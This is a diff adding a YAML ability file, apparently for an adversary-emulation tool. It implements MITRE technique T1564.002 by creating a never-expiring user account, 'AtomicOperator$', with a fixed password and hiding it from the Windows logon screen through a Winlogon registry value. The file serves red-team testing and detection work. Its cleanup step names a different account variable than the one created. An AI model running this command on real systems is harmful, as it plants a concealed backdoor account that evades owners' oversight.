@@ -1,0 +1,24 @@
+---
+- id: 94ada6941f651b12c2a7fbba310a4bde
+  name: Create Hidden User in Registry
+  description: 'Adversaries may similarly hide user accounts in Windows. Adversaries
+    can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+    Registry key value to 0 for a specific user to prevent that user from being listed
+    on the logon screen.
+
+    Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
+
+    '
+  tactic: stealth
+  technique:
+    attack_id: T1564.002
+    name: 'Hide Artifacts: Hidden Users'
+  platforms:
+    windows:
+      cmd:
+        command: NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG
+          ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"
+          /v AtomicOperator$ /t REG_DWORD /d 0
+        payloads: []
+        cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"
+          /v AtomicOperator$ /f >nul 2>&1 && net user ${user_name}$ /delete >nul 2>&1
